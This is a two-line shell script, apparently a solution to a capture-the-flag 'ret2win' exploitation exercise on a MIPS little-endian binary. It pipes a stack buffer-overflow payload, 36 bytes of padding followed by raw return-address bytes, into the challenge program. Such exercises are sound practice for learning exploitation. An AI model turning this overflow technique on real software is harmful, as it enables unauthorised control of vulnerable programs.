#!/bin/bash
python -c "print('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\n@\x00')" | ./ret2win_mipsel
